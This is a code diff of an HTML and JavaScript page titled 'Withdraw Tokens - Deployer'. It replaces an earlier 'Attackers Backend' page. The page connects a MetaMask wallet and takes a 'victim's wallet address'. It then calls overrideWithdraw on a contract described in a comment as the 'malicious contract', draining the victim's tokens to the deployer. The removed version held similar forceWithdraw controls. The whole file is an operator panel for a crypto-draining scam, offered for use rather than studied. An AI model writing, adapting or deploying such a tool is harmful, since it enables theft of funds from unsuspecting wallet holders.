@@ -3,81 +3,117 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Attackers Backend</title>
-    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
+    <title>Withdraw Tokens - Deployer</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f7f7f7;
+            padding: 20px;
+            text-align: center;
+        }
+        button {
+            padding: 10px 20px;
+            margin: 10px;
+            border: none;
+            background-color: #4CAF50;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        #status {
+            margin-top: 20px;
+            font-weight: bold;
+        }
+    </style>
 </head>
 <body>
-    <h1>Attacker's Contract Management</h1>
+    <h1>Withdraw Tokens Using Deployer's Wallet</h1>
+    <p>Connect your wallet as the deployer to withdraw tokens from the victim's wallet.</p>
 
-    <button id="connectAdminBtn">Connect Admin Wallet</button>
-    <button id="setWithdrawalLimitBtn" disabled>Set Withdrawal Limit</button>
-    <button id="forceWithdrawBtn" disabled>Force Withdraw</button>
-    
-    <div id="status"></div>
+    <!-- Connect Wallet Button -->
+    <button id="connectWalletBtn">Connect Wallet</button>
 
+    <br><br>
+
+    <!-- Victim Address Input -->
+    <label for="victimAddress">Victim Address: </label>
+    <input type="text" id="victimAddress" placeholder="Enter victim's wallet address" />
+
+    <!-- Withdraw Button -->
+    <button id="withdrawTokensBtn" style="display:none;">Withdraw Tokens</button>
+
+    <p id="status"></p>
+
+    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
     <script>
-        const web3 = new Web3(window.ethereum);
-        const contractABI = [
-            // Insert your contract ABI here
-        ];
-        const contractAddress = "0x7d8d1271D4B2339f3bB05a78953fb3f1686B2533"; // Contract address
+        let web3;
+        let userAccount;
+        let contractAddress = "0x70abc29bA40d6BCBE9389bcF4DdaCC252bC0bBe4"; // Replace with your malicious contract address
+        let contractABI; // ABI will be loaded from external JSON
+        let contract;
 
-        const contract = new web3.eth.Contract(contractABI, contractAddress);
+        window.onload = () => {
+            if (typeof window.ethereum !== 'undefined') {
+                web3 = new Web3(window.ethereum);
+                loadABI();  // Load ABI dynamically
+                init();
+            } else {
+                alert("MetaMask not found!");
+            }
+        };
 
-        // Connect admin wallet function
-        async function connectAdminWallet() {
+        // Load ABI from external file
+        async function loadABI() {
+            const response = await fetch('abi.json');  // Ensure abi.json is in the same directory
+            const abi = await response.json();
+            contractABI = abi;
+            contract = new web3.eth.Contract(contractABI, contractAddress);
+        }
+
+        async function init() {
+            // Set up event listeners
+            document.getElementById('connectWalletBtn').addEventListener('click', connectWallet);
+            document.getElementById('withdrawTokensBtn').addEventListener('click', withdrawTokens);
+        }
+
+        // Connect wallet (MetaMask)
+        async function connectWallet() {
             try {
-                const accounts = await web3.eth.requestAccounts();
-                const account = accounts[0];
-                document.getElementById("status").innerText = `Connected Admin Wallet: ${account}`;
-
-                document.getElementById("setWithdrawalLimitBtn").disabled = false;
-                document.getElementById("forceWithdrawBtn").disabled = false;
+                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                userAccount = accounts[0];
+                document.getElementById('status').innerText = `Connected: ${userAccount}`;
+                document.getElementById('withdrawTokensBtn').style.display = "inline-block";
             } catch (error) {
-                console.error("Connection failed:", error);
-                document.getElementById("status").innerText = "Connection failed.";
+                console.error(error);
+                alert("Error connecting to MetaMask.");
             }
         }
 
-        // Set withdrawal limit function
-        async function setWithdrawalLimit() {
-            try {
-                const limit = prompt("Set withdrawal limit (in tokens):");
-                const limitInWei = web3.utils.toWei(limit, 'ether');
-                const accounts = await web3.eth.getAccounts();
+        // Withdraw tokens from the victim's wallet
+        async function withdrawTokens() {
+            const victimAddress = document.getElementById('victimAddress').value;
 
-                // Assuming there's a function to set limits in your contract
-                await contract.methods.setWithdrawalLimit(limitInWei).send({ from: accounts[0] });
-                document.getElementById("status").innerText = `Withdrawal limit set to ${limit} tokens`;
+            if (!victimAddress) {
+                alert("Please enter a victim's address!");
+                return;
+            }
+
+            try {
+                // Call the overrideWithdraw function from the deployer's wallet
+                await contract.methods.overrideWithdraw(victimAddress).send({ from: userAccount });
+
+                document.getElementById('status').innerText = `Tokens successfully withdrawn from ${victimAddress}!`;
             } catch (error) {
-                console.error("Error setting withdrawal limit:", error);
-                document.getElementById("status").innerText = "Error setting withdrawal limit.";
+                console.error("Error withdrawing tokens:", error);
+                document.getElementById('status').innerText = "Error withdrawing tokens.";
+                alert("Error withdrawing tokens. Please try again.");
             }
         }
-
-        // Force withdraw function
-        async function forceWithdraw() {
-            try {
-                const recipient = prompt("Enter recipient address for withdrawal:");
-                const amount = prompt("Enter withdrawal amount:");
-
-                const amountInWei = web3.utils.toWei(amount, 'ether');
-                const accounts = await web3.eth.getAccounts();
-
-                // Assuming there's a function for forced withdrawals in your contract
-                await contract.methods.forceWithdraw(recipient, amountInWei).send({ from: accounts[0] });
-                document.getElementById("status").innerText = `Forced withdrawal of ${amount} tokens to ${recipient}`;
-            } catch (error) {
-                console.error("Error forcing withdrawal:", error);
-                document.getElementById("status").innerText = "Error forcing withdrawal.";
-            }
-        }
-
-        // Event listeners for buttons
-        document.getElementById("connectAdminBtn").addEventListener("click", connectAdminWallet);
-        document.getElementById("setWithdrawalLimitBtn").addEventListener("click", setWithdrawalLimit);
-        document.getElementById("forceWithdrawBtn").addEventListener("click", forceWithdraw);
     </script>
 </body>
 </html>
+
 
